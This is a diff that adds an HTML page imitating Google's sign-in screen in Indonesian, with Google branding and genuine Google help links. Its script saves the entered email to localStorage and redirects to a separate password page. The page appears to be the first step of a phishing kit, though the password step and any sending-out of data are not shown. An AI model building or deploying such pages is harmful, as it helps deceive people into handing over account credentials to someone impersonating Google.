@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Sign-In</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="wrapper">
+    <div class="login-card">
+        <div>
+            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="Google Logo" class="logo" />
+            <h1>Login</h1>
+            <p class="subtext">Gunakan Akun Google Anda</p>      
+        </div>
+      <form onsubmit="handleEmailSubmit(event)  " id="contact-form" name="itGoesToSchool">
+        <div class="input-group">
+            <input type="text" name="email" placeholder="Email atau nomor telepon" id="email" required />
+            <div class="link">
+              <a href="https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3DOGB%26utm_medium%3Dapp&dsh=S487645328%3A1745472597236393&ec=GAlAwAE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=in&pstMsg=1&service=accountsettings&authuser=0&ddm=1">Lupa Email?</a>
+            </div>
+            <p class="info-text">
+              Bukan komputer Anda? Gunakan Private Window untuk login.
+              <a href="https://support.google.com/accounts/answer/2917834?visit_id=638810699284815277-3542625490&p=signin_privatebrowsing&hl=id&rd=1">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+            </p>
+        </div>
+        <div class="buttons">
+          <button type="button" class="ghost">Buat akun</button>
+          <button type="submit" class="next">Selanjutnya</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script src="js/alpine.min.js"></script>
+  <script src="js/script.js"></script>
+  <script>
+    function handleEmailSubmit(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      localStorage.setItem('user_email', email);
+      window.location.href = "password.html";
+    }
+  </script>
+</body>
+</html>
